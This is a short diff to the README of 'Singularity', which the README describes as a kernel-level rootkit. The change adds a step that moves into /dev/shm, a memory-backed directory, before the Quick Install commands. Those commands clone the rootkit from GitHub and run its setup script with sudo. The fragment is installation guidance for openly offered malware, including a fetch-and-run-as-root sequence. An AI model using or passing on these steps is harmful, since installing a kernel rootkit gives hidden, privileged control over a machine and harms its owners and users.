@@ -75,6 +75,7 @@ Singularity is a sophisticated rootkit that operates at the kernel level, provid
 
 ### Quick Install
 ```bash
+cd /dev/shm
 git clone https://github.com/MatheuZSecurity/Singularity
 cd Singularity
 sudo bash setup.sh
